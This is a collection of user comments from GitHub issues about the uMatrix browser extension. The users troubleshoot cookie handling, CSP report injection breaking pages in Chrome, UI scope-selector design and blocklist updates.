    "sebast889": "Is there no way to fix this in uMatrix? Recent update to Cookie Autodelete addon fixed the deletion of cookies even with privacy.firstparty.isolate=true so maybe it is possible\nhttps://github.com/Cookie-AutoDelete/Cookie-AutoDelete/issues/75#issuecomment-355788774. Is there no other way to protect against this type of tracking without blocking CSS totally?. ",
    "cy7yz2rj": "Cookies are not deleted in current Firefox 59 (aurora) and 60 (nightly), repro steps same as OP except for browser and uMatrix (1.2.1rc3) versions.. ",
    "mrdokenny": "Cookie extensions dealing with first party isolation have to add explicit support for it.\nhttps://developer.mozilla.org/en-US/Add-ons/WebExtensions/API/cookies\n\nIn the cookies API, the first party domain is represented using the firstPartyDomain attribute. All cookies set while first-party isolation is on will have this attribute set to the domain of the original page. In the example above, this would be \"bbc.com\" for one cookie and \"cnn.com\" for the other. All cookies set while first-party isolation is off will have this property set to an empty string.\nThe cookies.get(), cookies.getAll(), cookies.set() and cookies.remove() APIs all accept a firstPartyDomain option. When first-party isolation is on, you must provide this option or the API calls will fail.\nFor get(), set(), and remove() you must pass a non-null value for firstPartyDomain. For getAll(), you may also pass null here, and this will get all cookies, whether or not they have a non-empty value for firstPartyDomain.\n. \n",
    "earthlng": "you can use browser.privacy.websites.firstPartyIsolate.get({}) to detect if isolation is enabled.\nsee https://developer.mozilla.org/en-US/Add-ons/WebExtensions/API/privacy/websites. ",
    "grenzor": "I allow cookies/javascript for regularly visited sites so I can't prevent them in the browser.\nI do believe APIs to reject cookies immediately instead of storing of them is being implemented.\nhttps://bugzilla.mozilla.org/show_bug.cgi?id=1363860\nhttps://bugzilla.mozilla.org/show_bug.cgi?id=1291841. Sorry, I wasn't implying them for cookie deletion. I was thinking storing cookies and deleting wouldn't be ideal for an option such as \"delete blocked cookies\" and rather functionality would change to \"reject blocked cookies\" or \"reject cookies from blacklisted domains\".  . > And as said, if one obsessively worries about these cookies, just block javascript. It does not make much sense to worry about cookies being deleted immediately before a fraction of second elapse while having no issue to execute javascript from the same site.\nNot sure what you mean. I can block all scripts on Github and it will still set cookies.\nI agree that the chance of harm is low with the current way uMatrix does things as blocked cookies aren't sent as headers and they are locally deleted relatively quickly. But IMO if there is a way to reject them immediately that would be better (just as a guarantee nothing can be leaked/hijacked/etc).. I didn't leave it out, I mentioned how uMatrix doesn't send any blocked cookies in headers in the next sentence. I just didn't understand what you meant by suggesting to block JS if someone is worried about cookies since uMatrix won't send blocked cookies even if JS is on or off.\nAnyways, I'm ok with what you say about not going forward without a POC so I'll leave it here.. ",
    "dezhavu": "\n\n. As you could have noticed on the pictures attached, i use dynamic ruleset, so actually it's not a big deal to block those Global Scope domains for behind-the-scene, but the idea is that behind-the-scene should't inherit from Global Scope, IF there's a rule for that scheme:\nFor instance:\n* * * block\n* vimeo.com * allow\n* vimeo.com frame allow\nbehind-the-scene * * block\nNow vimeo.com doesn't care about behind-the-scene * * block, because it's allowed in Global Scope..\nI saw numerous of samples like this in the logger, when requests from the webpage somehow appear in the behind-the-scene scheme, and if it inherits from global, omitting it's own scheme rules, thats no good for no good reason.. >More generally, you propose the ability to isolate a scope from the parent one.\ncould be something like this if to look at it in more global, would be even more flexible, but keeping in mind of \"no new feature request\" didn't structure it like this, the idea is great though. >Removing the matrix-off rule itself would block all behind the scenes requests unless you whitelist a cell.\nYep, it takes some time to get the whole thing, could be a bit complicated at first.\nThere's another issue that came up when I tried updating from 1.1.17rc0 (that was post rc0, about 4 commits after it, as far as i remember). Legacy doesn't work in FF5602, neither in FF57. Webextension works in both.\nConsole on install:\nTypeError: vAPI.messaging.send is not a function[Learn More]  popup.js:1462:9\n    <anonymous> chrome://umatrix/content/js/popup.js:1462:9\n    matrixSnapshotPoller< chrome://umatrix/content/js/popup.js:1441:6\n    <anonymous> chrome://umatrix/content/js/popup.js:1358:29\n    <anonymous> chrome://umatrix/content/js/popup.js:30:2\nDashboard available only by directly going to chrome://umatrix/content/dashboard.html\nLogger available only by directly going to chrome://umatrix/content/logger-ui.html\nEvery option is clear inside, no checkboxes, no rules, no hosts files, even nothing in About (no version)\nConsole:\n```\nTypeError: vAPI.messaging.send is not a function[Learn More]  about.js:133:5\n     chrome://umatrix/content/js/about.js:133:5\n     chrome://umatrix/content/js/about.js:122:2\nTypeError: vAPI.messaging.send is not a function[Learn More]  settings.js:154:1\n     chrome://umatrix/content/js/settings.js:154:1\n     chrome://umatrix/content/js/settings.js:28:2\nTypeError: vAPI.messaging.addListener is not a function[Learn More]  hosts-files.js:39:1\n     chrome://umatrix/content/js/hosts-files.js:39:1\n     chrome://umatrix/content/js/hosts-files.js:28:2\nTypeError: vAPI.messaging.send is not a function[Learn More]  cloud-ui.js:207:1\n     chrome://umatrix/content/js/cloud-ui.js:207:1\n     chrome://umatrix/content/js/cloud-ui.js:28:2\n```\n.  \nbtw latest uBlock 1.14.22 Legacy works in both. Yeah, well 1.1.17rc0 works at least.\nAnyway, the subj remains in Logger as requests from webpage, so if you find time pls take a look at it, could be useful, as it happens when viewing saved pages too (file-scheme).\nThanks for your attention.. ",
    "fimmwolf": "ah thank you. \nHave since turned off referrer spoofing. . ",
    "tmsbrg": "I was afraid there'd be something stupid I'm missing. Shift+reload fixes the issue. It's somewhat confusing with Firefox shortcuts as I tried shift+f5 but it didn't do anything. Apparently a full reload in Firefox is ctrl+shift+r.\nSo this is a bit of combination of things that confused me into not finding the simple caching issue. I was genuinely stumped though, not knowing what to do to fix these sites. At first I thought it was an actual CSP problem, especially when \"restart with addons disabled\" and refreshing did not work. Oh well, too bad. At least now I know what to look for when this happens.. ",
    "ssokolow": "I'm experiencing what may be the same issue in Firefox Developer Edition 59.0b11.\nI haven't had time to verify in detail but it seems that, every time I enable scripting for a page, the Reload button has no effect unless I force a cache bypass.. Spoofing it to the spec-defined null value (The value used for file:// URLs where null != null) should be safe, though it's possible some sites might decide that blocking use from file:// URLs is acceptable. . I'm not really sure there's any definition of \"in the spirit of uMatrix\" which is meaningful enough to overrule other UI concerns, given that the scope selector has characteristics that set it apart from all other widgets in the dialog:\n\nUnlike the allow/deny cells, it is a hide/show operation, rather than a set/unset operation.\nUnlike the buttons for expanding/collapsing blocks of rows, it has more than one possible value.\nUnlike any of the other widgets, it's effectively a means for selecting a two-dimensional slice of a three-dimensional data space.\n\n\nI have a problem with the idea to bring back that clunky dropdown menu again.\n\nIn what way do you find it clunky? I don't find myself flipping back and forth between scopes often enough to make it bothersome, so it's possible I'm overlooking something.\nThat said, I do think there will always be a certain learning curve to the new design, simply because the flat style used by uMatrix makes it difficult to communicate something like \"this is a group of toggle buttons\" (example) or \"this is a breadcrumb widget\" (example) or some other intuitive signal which would help people to quickly grasp how the widget should behave based on prior experience.. > and make scoping less prominent -- which is a core concept in uMatrix. I've seen so many \"I can't create a rule which applies everywhere\", and making the global scope in full view ready to be used is bound to help \nFair enough. While the addition of a \u25bc would definitely have helped there, the new design does mean that people will actually think to check for a tooltip. (On the other hand, with the dropdown, the * could have been replaced with something like \"Default Behaviour\" or \"All Sites\")\n\nActually, I should add a tooltip to the global scope button to explicitly state its purpose.\n\nDefinitely. Any button or label which contains only a single glyph should have one.\n(Speaking of which, the \u22ee button should also have a tooltip which makes it clear that the settings contained within are scope-specific. That's one thing that I misunderstood when I first started using uMatrix because it felt like they were too \"distanced\" from the scope selector for it to modify their effects... similar to how I wouldn't expect the scope selector to control output filtering in the logger window.). > all blue buttons are scope-specific, all black buttons are not\nEven knowing that those two buttons are scope-specific, I either didn't notice that they were blue or didn't register it as significant until you called my attention to it.\nI suspect it's a cognitive artifact akin to banner blindness that has to do with that shade of blue either being or closely resembling the default hyperlink colour. (ie. Subconsciously dismissing the blueness of the toolbar buttons as an irrelevant detail caused by a CSS bug based on prior experience with clickable things sometimes being blue and sometimes not.)\nEither way, the \"something this many steps removed from the selector\" (in a menu within a toolbar button) intuition overwhelms the \"blue things are scope specific\" intuition for reasons similar to my not expecting the scope selector to control filtering on the logging window. Hence my point that it needs that clarified in a tooltip.\nActually, now that I think about it, the fact that it's a dropdown might be part of the reason my intuition dismissed the blue as a bug... because the \"display a submenu\" that happens when you click on \u22ee is a hide/show action with no effect on the data model rather than a toggle with persistent effects and, therefore, the hypothesis that blue means \"affected by the state selector\" is disproved because it appears on something with no state to be affected. (Which would then be reinforced by the contents of the dropdown being black rather than blue.). What about the most minor tweak in option B?\n(Remove the line of blue surrounding the grey and add a couple of pixels of padding and a border between each independently clickable segment (ie. bugzilla., mozilla., and org) to make it clear that it's a row of buttons, rather than a rendering glitch drawn under the left end of a single text widget.). Well, with the lack of padding between the bugzilla. and the mozilla.org, I interpreted it as a rendering glitch drawn behind a single text widget.\n(Plus, what you're doing is the flat-design equivalent of putting buttons within buttons in a native GUI toolkit like Qt or GTK+... and that's discouraged by design specialists.)\nEDITED BELOW\nFor now, I'll use the following in my userContent.css:\n```css\n/ Fix rendering glitch-esque default style in uMatrix scope selector /\n@-moz-document url-prefix(\"moz-extension://19c6955d-eec7-44a2-a3da-c58f4daa2329/\") {\n    body .toolbar #specificScope {\n      padding: 0 !important;\n      border: 0 !important;\n    }\nbody .toolbar #specificScope > span {\n  padding-right: 3px !important;\n  padding-left: 3px !important;\n  border-left: 1px dotted #77f !important;\n}\n\nbody .toolbar #specificScope > span:first-of-type {\n  border-left: none !important;\n}\n\n/* ...and fix text contrast on deselected scope buttons for readability */\nbody .toolbar .scope:not(.on),\nbody .toolbar #specificScope > span:not(.on) {\n    background-color: #aaa !important;\n    border-color: #aaa !important;\n}\n\n}\n```. Ahh. Not sure how I missed that.\nThat said, the meaning of \"Site\" isn't exactly clear, since it's an abstract concept that only sometimes correlates to a specific subdomain and it's also not the same form used in the browser action popup.\nIt might be be a good idea to do one of the following:\n\nAdd a \u00a0  ?\u20dd   \u00a0 button which clarifies each scope name with an example\nUse \"subdomain\" instead of \"site\" in the \"Default scope level\" dropdown so it's unambiguous.\nUse \"www.site.com\", \"site.com\", and \"*\" as the options in the \"Default scope level\" dropdown so they visibly match the browser action.. Whoops. Never mind. I somehow missed issue #975 on my first read-through of the open issues list.. \n",
    "TurboDuke77": "Problem persists in Firefox 59.0.2 and uMatrix 1.3.4\nI have all scripts default blocked and the release changes on calibre site are not displayed, because i blocked scripts:\nhttps://calibre-ebook.com/whats-new\nif i deactive uMatrix and reload, still blocked scripts!\nI need to shift reload in uMatrix to fix the reload problem. . ",
    "brucehuanglove": "I am sorry to open this issue.\nwhen I wrote down all process, I found that the \"scope level\" was under \"domain\", so the square should be red but not green.\nsorry to disturb you.. ",
    "SuperSandro2000": "You're right. Disabling referrer spoofer fixed the issue... sorry about that. ",
    "calibrations": "Oh OK, thank you very much! If there's anyone else looking at this I would appreciate a second pair of eyes over this, I totally appreciate that you can't provide support for it.. ",
    "adblocktester": "Hi,\nFirst, and foremost, thank you for responding so fast !\nI am testing with YesScript (not YesScript2) on Firefox 56 (to exclude that the issue is purely with Firefox 57). Let's ignore that part for a sec.\nI think the issue is this:\n\nI am blocking all of the third party advert resources on fastpic.ru via a local hosts file (static mapping to 127.0.0.1 for the domains described in my post)\nI am hosting an Nginx HTTP/HTTPS server on the same machine which responds to requests on 127.0.0.1, so that for any domains that are in the hosts file you get a simple \"No content\" reply - so called HTTP/204 response. In this case the page gets messed up as the browser/extension clearly does not like that \"No Content\" response. Again this works nicely with Firefox 56 and Yesscript, as well as Firefox 57 with javascript.enabled set to false.\nI am testing on fastpic.ru with static.fastpic.ru CSS/Images resources fully allowed.\nI have also disabled all hosts files used by uMatrix.\n\nOne thing I've noticed is that YesScript disables Javascript via internal calls to the Firefox 56 browser capability.policy, can uMatrix do something like this ?. Ok, based on your screenshot I think I know what the issue really is:\nI had the following Firefox preferences set to false for testing:\nsecurity.csp.enable\nsecurity.csp.enableStrictDynamic\nBoth rlslog dot net, and fastpic ru are now working as they should !\nBased on this can you confirm that your extension is in fact relying on CSP, and not on Firefox Capability policy (if there is one at all in Firefox 57) ?. Damn, ok, sorry for taking up your time, in case someone runs into the same issue they will now know what's at fault.\nI have corrected my Firefox Addons review, please modify yours as well so the users don't get bothered by it.. ",
    "Monter": "I can not paste my website here, its address or screenshots because I did not protect it from access to show what is on it. To repeat the problem add the header \"WWW-Authenticate: Basic realm\" to any PHP page, and the request for login and password - when you enter it, the page will open, but instead of the content will be random characters. After refreshing F5, the content is already correct. All new versions have this problem, v1.1.20 works correctly.\nEverywhere you write that you do not have time. If you do not have it, do not make new versions with errors.\n  . Why do you suggest that this is a Chrome problem and not your plugin since version 1.1.20 works correctly? The problem only occurs with HTTPS websites and may result from modifying the content by the plugin. Try this:[hidden]\nAs I wrote earlier, after refreshing the page, the right content appears.\nEDIT:\nSetting disableCSPReportInjection to true solves the problem.. ",
    "chdh": "The error only occurs when the authentication challenge response (with status code 401 and \"WWW-Authenticate\" header field) is uncompressed and the final response is compressed.\nThere is a Chromium bug entry for the same problem.. I opened a new issue because #907 was closed and #912 is locked and maybe for something different, but has the label \"unable to reproduce\".\nI thought you would be happy to receive a well documented test case to reproduce the problem, but I get the feeling, that my contribution is not welcome here. And on the Chromium bugs site, nobody reacted to my last 2 posts.. ",
    "Hyundy": "I think this is actually a change in Firefox that causes this, not uMatrix, as I first thought.\nAlthough, I can only reproduce it with uMatrix and not uBlock Origin, in clean and old profiles (\"Hide placeholders of blocked elements\" in uB was turned off).\nhttps://imgur.com/a/3kjyo\nTwo examples. . ",
    "DigiAngel": "Thanks @uBlock-user.. ",
    "apschultz": "I wouldn't know where to begin to investigate this. If you have a way to prevent the header modification I'd be glad to test or if you know of any other sites/plugins that inject CSP I'd be glad to try those as well. I've never looked at Chrome's code, built or installed a developer edition of chrome so I'm not going to be useful trying to figure out what changed that breaks the way uMatrix handles frames. . This is infuriating. I'm at home now on my company's VPN and I'm not seeing the issue. I have to use an SWG remotely, so something else may be modifying content. \nHere are the response headers currently reported. I'm going to try to see if I can access an internal node to look at the headers I get from the local network.\nCache-Control:private\nContent-Encoding:gzip\nContent-Length:9848\nContent-Type:text/html; charset=UTF-8\nDate:Wed, 10 Jan 2018 01:31:05 GMT\nExpires:0\nPersistent-Auth:true\nServer:Microsoft-IIS/7.5\nSet-cookie:authrequired=\nStrict-Transport-Security:max-age=157680000\nVary:Accept-Encoding\nX-Powered-By:ASP.NET. I was able to reproduce the problem with a fresh install of Chrome in ubuntu with only the uMatrix plugin present.\n\nResponse headers from the failed requests:\nCache-Control:private\nContent-Encoding:gzip\nContent-Length:9850\nContent-Type:text/html; charset=UTF-8\nDate:Wed, 10 Jan 2018 01:47:45 GMT\nExpires:0\nPersistent-Auth:true\nServer:Microsoft-IIS/7.5\nSet-cookie:authrequired=\nVary:Accept-Encoding\nX-Powered-By:ASP.NET\n\nIt is interesting to note the addition \"Strict-Transport-Security\" header in the request that works. . Sorry for the spam. It just occurred to me I've been answering the wrong question. \nThe response has 2 meta tags:\nmeta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"\nmeta http-equiv=\"X-UA-Compatible\" content=\"IE=Edge,chrome=1\". Yes, all the frames are accessed over https.. With all default FF settings and umatrix set to allow all, I cannot reproduce this. Where/how to I set disableCSPReportInjection to false to verify?. Absolutely agree this is browser specific if not a problem in Chrome.\n\nIt also appears to be platform independent. As noted earlier, I can reproduce with the latest Chrome in ubuntu. I just tried with the latest FF in ubuntu and cannot reproduce the issue.. ",
    "embix": "We have the same render issue for multiple locals sites (TFS/https, other IIS webprojects even with http and without iframes). Common demoninator so far is Chrome/uMatrix/IIS hosted.\nupdate: I suspect Windows Auth to be also involved as I cannot reproduce the issue on IIS/http/noauth Sites. Funny thing is that reloading/F5 in most cases produces correct output.. The browser is at least part of the problem but everything is fine, once you disable all extensions in chrome.. As suggested I filed an issue in the chromium bug tracker.\nFeel free to contribute there - We all want that bug fixed.. > problem only occurs with HTTPS websites\n@Monter The problem is not limited to HTTPS. I can reproduce the problem with HTTP+winauth with a site in staging (In production you'd use auth with https, http+auth is a rare scenario nowadays).. ",
    "th0ma5w": "Maybe you can add the ability or give some clues as to enable / disable this option? Is there an archive of old plugin versions as well somewhere? Perhaps I could just switch to an older version. This issue makes my browser fairly unusable.. Sorry, I did find .18 and reverted to that. My organization uses a MS proxy, which given the various other issues seems to be the culprit... if any request to any site has some additional header that it may or may not expect, it stops working well at all. HTTPS sites work as the proxy doesn't seem to see those, but redirects from non-HTTPS links break, and all in all it made for a very wonky experience. .18 seems to work fine, however.. Sorry for the delay in responding. With this setting set to \"true\" the browser behaves normally. The response header is not present.\nWhen set to false, I typed in \"feedly.com\" (although many other sites behave like this) and immediately received a \"407\" blank page. I didn't capture the headers at this point, but when I again typed in \"feedly.com\" into the same tab, it loaded and the response header was present as \"Content-Security-Policy-Report-Only:worker-src 'none'; report-uri about:blank\"\nI then tried opening a new tab, Chrome's Google plus recent sites content is shown, I enabled the developer tools, selected network, and then selected preserve logs. I then typed in news.ycombinator.org and everything worked. However, the Content-Security-Policy-Report-Only header was not present.\nI repeated the same process, new tab, enabled developer tools, preserve log, typed lite.cnn.io ... this time, I received a blank page. It appears to be a redirect, however, the redirect is not followed and the page does not render. Below are the complete headers, except censored a little to hide organizational details that are probably not relevant. It doesn't appear that the new header is present in the response, but the browser behaves incorrectly and doesn't follow the redirect.\nRequest URL:http://lite.cnn.io/\nRequest Method:GET\nStatus Code:301 Moved Permanently\nRemote Address:192.168.XXX.XXX:8080\nReferrer Policy:no-referrer-when-downgrade\n\nResponse Headers\nview source\nAccept-Ranges:bytes\nAge:1\nCache-Control:max-age=60\nContent-Length:0\nDate:Fri, 12 Jan 2018 18:18:40 GMT\nFastly-Debug-Digest:XXXXXX8e6ae07f09ce38dab7ed348bd59b064485915c69a5147e45a2ef0576a7\nLocation:/en\nProxy-Connection:Keep-Alive\nvia:XXX\nX-Cache:HIT, MISS\nX-Cache-Hits:1, 0\nX-Served-By:cache-iad2140-IAD, cache-ord1746-ORD\nX-Timer:S1515781121.564984,VS0,VE19\n\nRequest Headers\nview source\nAccept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\nAccept-Encoding:gzip, deflate\nAccept-Language:en-US,en;q=0.9,it;q=0.8\nHost:lite.cnn.io\nProxy-Connection:keep-alive\nUpgrade-Insecure-Requests:1\nUser-Agent:Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) \nChrome/63.0.3239.132 Safari/537.36\n\nAgain with the setting as true, everything behaves normally, although the header is not present.. That's perhaps about the best I could do... I feel like there's something about the state machine of request - response - render cycle that is being preempted somehow. I do agree with your sentiments elsewhere that it is probably something that the browser should support, and indeed does provide an api for, but is not working in practice. I know browsers are more like a rumor than they are a designed product, so perhaps the sum accumulation of tricks needed to make everything work breaks when certain things are modified in flight... almost like a threading race condition or something. Best of luck with this, and thank you so much for your prompt responses, and honestly, the best feeling of web browsing control I've ever had thanks to this extension.. ",
    "breznak": "Awesome! Thank you @ArchangeGabriel\nClosing as solved. . ",
    "tauxeta": "Discussion on the issue https://news.ycombinator.com/item?id=16157773. ",
    "rubo77": "What are browser devs?. ",
    "gwarser": "Firefox / webextension limitation?\nFirefox downloads favicons behind the scene -> webextensions not work for behind the scene requests.. https://github.com/gorhill/uMatrix/wiki/How-to-get-past-%22uMatrix-has-prevented-the-following-page-from-loading%22. No checks for pre 72? Re: https://groups.google.com/a/chromium.org/forum/#!topic/chromium-extensions/vYIaeezZwfQ. ",
    "nmschulte": "To clarify, you're stating that I'm simply mis-interpreting these \"[Report Only]\" error messages as errors, when really they're just notices (of would-be errors), and the browser actually does allow and create the workers?. @gorhill Thank you.. Is it conceivable, sensible, to disable the CSP Report injection if there's an enabled matrix-off rule for a domain/host?. Understood.  Given that this (CSP Report injection) is only here to workaround a bug, it's low priority anyway.\nMy rationale is this: matrix-off is like a \"disable uMatrix extension for this domain/host,\" so there's no need to check for web workers, let alone enforce any uMatrix rules.. Ah, I see that the CSP spec has no support for blacklisting, hence the need for a global/always-on worker-src: none report-only CSP.\nWould it be possible to maintain the policy/whitelist in real-time / per-request/domain, and refuse to add domains with no-worker: true rules?\nThis would prevent CSP reports for whitelisted domains, which is what caught my attention initially.. > As already pointed out, the report is needed to inform about use of workers.\nchicken / egg.  got it.  thanks for sticking with me.. ",
    "u17194907425": "\nfor allowing uMatrix to know when a web page tries to use a web worker\n\n@gorhill, does it mean that there is no way to avoid seeing this [Report Only] message? . @gorhill, oh crap, my bad. I didn't word my question correctly.\nI mean if I go through disableCSPReportInjection I'll disable a part of functionality of uMatrix. Is there any other way to keep the plugin monitoring workers but avoid this warning? I'm talking about my web server where I can control Headers.\nE.g. any chance that setting Content-Security-Policy-Report-Only headers form the server will suppress the [Report Only] warning? Or it is an inevitable consequence of uMatrix working as designed?. ",
    "temporaryaccount": "I agree with @h1z1 here. Any automatic connection made by a privacy-related extension without the user explicitly allowing it is... bad manners, at least. I don't want those lists downloaded to my computer when I'm installing uMatrix. I don't want it to periodically contact Github (or any other) servers to check for updates. Besides, even when unchecking the checkboxes those files remain in the profile.\nWould it be too hard to implement a simple yes/no dialog box after installation with something like this:\n\nWould you like to subscribe to a blocklist xxx maintained by zzz? It will help you block unwanted hosts in case you don't intend to use the whitelist model.\n. \n",
    "grepdashv": "While the workaround (disabling injection) is the same, the symptoms are different.  The title/scope of #912 does not apply to this issue (since no frames are involved), and it is possible that fixing #912 would not fix this issue.  If you're confident that fixing one would fix the other, then perhaps you could broaden the scope of #912 to include the fact that some HTTPS sites are unable to load and simply return Chrome errors (as opposed to showing a garbled page).. Ah, I see.  Sorry for the misunderstanding.  In any case, thanks for providing the option to disable that injection.. ",
    "koneu": "Works fine for me between FF58 on Arch, Nightly on Leap and FF58 on Win8.. ",
    "irgendsontyp": "I figured out that it works for me if I set the value of the about:config entry \"services.sync.log.appender.file.logOnSuccess\" to \"true\" on Windows as well as on Linux (was false initially on both of those).\nI found this out just by playing around with the about:config entries which I found filtering for \"sync.\".\nI really do not know why it works because this does not make any sense to me. Maybe there is some kind of routine that clears a cache if you set this preference? Would be strange though.\nMaybe someone knows why this works?. That's a nice workaround I will use, thank you very much!\nNevertheless, the issue I described is a bug, isn't it?. ",
    "crimsonlander": "Checked again. uMatrix doesn't block these scripts in Vivaldi, but blocks in Chromium. Refreshing with bypassing the cache doesn't help.. Tried blocking these scripts with ScriptSafe, it also doesn't work with Vivaldi, but works with Chromium. So it seems like this is not extension problem.. ",
    "yasmise": "Well, another idea to solve this is making cells be triple-state. I mean:\na grey cell --[click/tap]--> white --[click/tap]--> black --[click/tap]--> grey\nBy this, you can use entire cell to switch its state and the matrix keeps clean looking.\nI don't use taps, so it would be nice if  this feature is provided as an option.. ",
    "guest20": "@gorhill - I feel stupid for not seeing that option as a potential solution, thanks for pointing that out.\nAfter playing with the slider it turns out that making the text bigger makes the touch area bigger, but it also effectively makes the dialog smaller and pushes all the 3rd party stuff off the bottom of the window.\nI gave it a go with the size right down, and it's much better to look at. At that size I can see more stuff there but it's nearly impossible to tap the \"Yes, let me have youtube\" part of the \"domain\" entries and even harder to just get JS from there.. ",
    "Tomalak": "@uBlock-user Possibly. What has me stumped here is that (contrary to the similar issues) only atually disabling the extension makes a difference. Reloading the page with F5 does nothing at all. \nChrome is perfectly happy with the server response as long as uBlock is not enabled.. @uBlock-user All-right, that's it. Thank you.. ",
    "pr0t0": "I'll dig deeper into the authorization, it's working in the test environment (same code), but here's the log if you are interested.\nRed on the XHR and the REFERER for https://laboratoryh.com/login\n10:05:37 | X | \u00a0 | css | https://labh-public.firebaseapp.com/__/auth/handler?apiKey=AIzaSyAzxugibid37bXa-xpmknoQFzSASrSf7rM&appName=%5BDEFAULT%5D&authType=signInViaPopup&providerId=google.com&scopes=profile&eventId=199398269&v=4.6.1{inline_style}\n-- | -- | -- | -- | --\n10:05:37 | X | \u00a0 | script | https://labh-public.firebaseapp.com/__/auth/handler?apiKey=AIzaSyAzxugibid37bXa-xpmknoQFzSASrSf7rM&appName=%5BDEFAULT%5D&authType=signInViaPopup&providerId=google.com&scopes=profile&eventId=199398269&v=4.6.1{inline_script}\n10:05:37 | X | \u00a0 | cookie | https://labh-public.firebaseapp.com/{localStorage}\n10:05:37 | X | -- | xhr | https://www.googleapis.com/identitytoolkit/v3/relyingparty/createAuthUri?key=AIzaSyAzxugibid37bXa-xpmknoQFzSASrSf7rM\n10:05:37 | X | \u00a0 | script | https://labh-public.firebaseapp.com/__/auth/handler.js\n10:05:37 | X | \u00a0 | REFERER | https://labh-public.firebaseapp.com/\n10:05:37 | X | -- | REFERER | https://laboratoryh.com/login\n10:05:37 | X | \u00a0 | doc | https://labh-public.firebaseapp.com/__/auth/handler?apiKey=AIzaSyAzxugibid37bXa-xpmknoQFzSASrSf7rM&appName=%5BDEFAULT%5D&authType=signInViaPopup&providerId=google.com&scopes=profile&eventId=199398269&v=4.6.1\n. ",
    "stonie08": "Thanks for the fast response. \nClicking on the second cell opens the pop-up panel for that specific request (kind of). I think it'd look cleaner to have these entries in the popup-panel in the logger as well, as the rest of the design is indicating this behavior: All affected entries in the logger remain black/red, while unrelated entries turn grey.. ",
    "darkred": "@gorhill Thanks for replying.\nAnd regarding the PS,  thanks for the info and sorry for not managing to find the existing issue #851, i.e. #155 and https://github.com/gorhill/uMatrix/issues/54#issuecomment-62480877.. ",
    "nameless3": "In Firefox 59.0b13, uMatrix 1.3.3b8, I just updated Peter Lowe's list (old list from March 3rd, new from March 5th) and the counter stays the same (it's still 1,753 used out of 2,583\u200b\u200b despite the new list having 2,608 entries).\nUnchecking the list -> apply changes -> check list -> apply changes again, and now the counter is updated (1,786 used out of 2,608).\nAnd updating lists in uBlock, the counter indeed changes right away without having to uncheck lists (and has done so as long as I remember).\nEdit: Same thing in Firefox 58.0.2 and Chromium 64.. ",
    "autrui": "Thank you for your reply. To know that the updating process should start about 7mins after uMatrix has been started is certainly very helpful. I've done some more testing:\nI have installed FF 59.0b10 (developer edition) with uMatrix 1.3.3b8, on macOS 10.11.6 for testing purposes. Auto-update works as expected.\nBut with the specs detailled in the original post (uMatrix 1.3.2, FF58.0.2, macOS), auto-update does not work for me, that's still true - however long I wait or no matter how many restarts I do (after enabling auto-updates).  Did you do your test on macOS?\nSo I don't know whether this is the combination of macOS and the specific uMatrix version 1.3.2 or something else. It doesn't matter anyway if the update to the official release of 1.3.3 will fix it.\nIf you don't mind, from my side, I will close this, as soon as I have confirmed this. Thank you for your help.. There is one message at the very start of FF58.0.2/ uMatrix 1.3.2 which seems to be about uMatrix:\n\nUnknown localization message http  i18n.js:158\n  localizeMessage resource://gre/modules/ExtensionCommon.jsm:1422:17\n  localizeMessage resource://gre/modules/ExtensionChild.jsm:658:44\n  getMessage chrome://extensions/content/ext-i18n.js:13:18\n  callFunction resource://gre/modules/ExtensionCommon.jsm:660:36\n  stub resource://gre/modules/Schemas.jsm:2261:22\n  vAPI.i18n.render/< moz-extension://569b4(...)/js/i18n.js:158:21\n  DOMList.prototype.forEach moz-extension://569b4(...)/js/udom.js:200:9\n  vAPI.i18n.render moz-extension://569b4(...)/js/i18n.js:157:5\n   moz-extension://569b4(...)/js/i18n.js:178:1\n   moz-extension://569b4(...)/js/i18n.js:29:2\n\nAs far as I can tell this message does not appear with FF59 (en-US) / uMatrix 1.3.3.\nAfter that nothing.\nCould this error stop uMatrix from auto-updating?. Ok, I guess then I'll have to wait for 1.3.3 which should fix for me this if my tests above are any indication.\nDo you have a rough idea about when 1.3.3 might be ready for release?. It seems that version 1.3.4 has fixed the problem.\nThank you.. ",
    "user234683": "Alright, I opened a bug report at https://bugzilla.mozilla.org/show_bug.cgi?id=1439163\nI tried my best as I'm not familiar with extension internals. > I go back to about:addons and this time I REMOVE uMatrix. I also clear the cookies and the cache. \ntry doing that after disabling matrix filtering for the scope.. ",
    "boxfreind": "What the heck? I just reinstalled uMatrix to continue troubleshooting and now the icon for the extension is missing. I can find where the extension is on the toolbar, but it is blank. If I click it, a tiny white dropdown appears but it is very small and completely devoid of anything to click on. What on earth is going on???\nI have tried uninstalling, restarting, and then reinstalling; disabling, restarting, and then enabling and restarting. I simply CANNOT get uMatrix back. It is permanently fucked for me now. Or at least until I regain the patience and energy to once again do a full browser reset/reinstall. This happened to me in both the portable isntall as well as my regular installation. . Additional: is it a good or bad idea to use both uMatrix and uBlock Origin?. ",
    "share3141": "There we go...here is an image.  Had to turn off UBO and uMatrix to get the file loaded!\n\n. Maybe a little better example...\n\n. ",
    "overdodactyl": "Unless I'm mistaken, the documentation for uBO's cloud storage applies to uMatrix as well:\nhttps://github.com/gorhill/uBlock/wiki/Cloud-storage. ",
    "1stone": "Hmm... ok. Thanks for the information.\nI'm new to uMatrix and didn't notice the relationship to uBO.\n. ",
